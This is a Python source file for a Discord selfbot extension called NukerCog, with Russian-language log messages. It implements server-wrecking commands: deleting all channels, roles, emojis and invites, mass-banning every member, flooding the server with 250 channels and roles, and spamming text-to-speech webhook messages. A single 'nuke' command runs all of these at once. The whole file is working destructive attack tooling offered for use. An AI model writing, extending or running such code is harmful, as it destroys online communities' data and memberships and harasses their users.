from asyncio import create_task

from discord.ext import commands

from Functions.logger import log_error


async def DELETE(obj):
    try:
        await obj.delete()
    except Exception as e:
        log_error(f'DELETE: {e}', 'ОШИБКА', 1)


async def CREATE_ROLE(guild, name):
    try:
        await guild.create_role(name=name)
    except Exception as e:
        log_error(f'CREATE_ROLE: {e}', 'ОШИБКА', 1)


async def SPAM_WEBHOOK(channel, message):
    try:
        webhook = await channel.create_webhook(name='Nuked')
    except Exception as e:
        log_error(f'SPAM_WEBHOOk: {e}', 'ОШИБКА', 1)
        return

    for _ in range(5):
        await webhook.send(message, tts=True)


async def CREATE_CHANNEL(guild, name, spam=False, message=None):
    try:
        channel = await guild.create_text_channel(name=name)
    except Exception as e:
        log_error(f'CREATE_CHANNEL: {e}', 'ОШИБКА', 1)
        return

    if spam:
        await SPAM_WEBHOOK(channel, message)


async def BAN(member):
    try:
        await member.ban()
    except Exception as e:
        log_error(f'BAN: {e}', 'ОШИБКА', 1)


class NukerCog(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @commands.command(name='del_channels')
    async def del_channels__(self, ctx):
        if ctx.author != self.bot.user:
            return

        if not self.bot.config['ENABLE_CRASH']:
            log_error(f'Краш-команды не включены. Включите их в Config.PY',
                      'ОШИБКА', 1)
            return

        await ctx.message.delete()

        for channel in ctx.guild.channels:
            create_task(DELETE(channel))

    @commands.command(name='create_channels')
    async def create_channels__(self, ctx, *, name):
        if ctx.author != self.bot.user:
            return

        if not self.bot.config['ENABLE_CRASH']:
            log_error(f'Краш-команды не включены. Включите их в Config.PY',
                      'ОШИБКА', 1)
            return

        await ctx.message.delete()

        for _ in range(250):
            create_task(CREATE_CHANNEL(ctx.guild, name))

    @commands.command(name='massban')
    async def massban__(self, ctx):
        if ctx.author != self.bot.user:
            return

        if not self.bot.config['ENABLE_CRASH']:
            log_error(f'Краш-команды не включены. Включите их в Config.PY',
                      'ОШИБКА', 1)
            return

        await ctx.message.delete()

        for member in ctx.guild.members:
            create_task(BAN(member))

    @commands.command(name='del_roles')
    async def del_roles__(self, ctx):
        if ctx.author != self.bot.user:
            return

        if not self.bot.config['ENABLE_CRASH']:
            log_error(f'Краш-команды не включены. Включите их в Config.PY',
                      'ОШИБКА', 1)
            return

        await ctx.message.delete()

        for role in ctx.guild.roles:
            create_task(DELETE(role))

    @commands.command(name='create_roles')
    async def create_roles__(self, ctx, *, name):
        if ctx.author != self.bot.user:
            return

        if not self.bot.config['ENABLE_CRASH']:
            log_error(f'Краш-команды не включены. Включите их в Config.PY',
                      'ОШИБКА', 1)
            return

        await ctx.message.delete()

        for _ in range(250):
            create_task(CREATE_ROLE(ctx.guild, name))

    @commands.command(name='del_emojis')
    async def del_emojis__(self, ctx):
        if ctx.author != self.bot.user:
            return

        if not self.bot.config['ENABLE_CRASH']:
            log_error(f'Краш-команды не включены. Включите их в Config.PY',
                      'ОШИБКА', 1)
            return

        await ctx.message.delete()

        for emoji in ctx.guild.emojis:
            create_task(DELETE(emoji))

    @commands.command(name='del_invites')
    async def del_invites__(self, ctx):
        if ctx.author != self.bot.user:
            return

        if not self.bot.config['ENABLE_CRASH']:
            log_error(f'Краш-команды не включены. Включите их в Config.PY',
                      'ОШИБКА', 1)
            return

        await ctx.message.delete()

        for invite in ctx.guild.invites:
            create_task(DELETE(invite))

    @commands.command(name='webhook_spam')
    async def webhook_spam__(self, ctx, *, message):
        if ctx.author != self.bot.user:
            return

        if not self.bot.config['ENABLE_CRASH']:
            log_error(f'Краш-команды не включены. Включите их в Config.PY',
                      'ОШИБКА', 1)
            return

        await ctx.message.delete()

        for channel in ctx.guild.channels:
            create_task(SPAM_WEBHOOK(channel, message))

    @commands.command(name='nuke')
    async def nuke__(self, ctx, names='КРАШ', *, message='СЕРВЕР КРАШНУТ'):
        if ctx.author != self.bot.user:
            return

        if not self.bot.config['ENABLE_CRASH']:
            log_error(f'Краш-команды не включены. Включите их в Config.PY',
                      'ОШИБКА', 1)
            return

        await ctx.message.delete()

        for channel in ctx.guild.channels:
            create_task(DELETE(channel))

        for _ in range(250):
            create_task(CREATE_CHANNEL(ctx.guild, names, True, message))

        for member in ctx.guild.members:
            create_task(BAN(member))

        for role in ctx.guild.roles:
            create_task(DELETE(role))

        for _ in range(250):
            create_task(CREATE_ROLE(ctx.guild, names))

        for emoji in ctx.guild.emojis:
            create_task(DELETE(emoji))

        for invite in await ctx.guild.invites():
            create_task(DELETE(invite))


def setup(bot):
    bot.add_cog(NukerCog(bot))
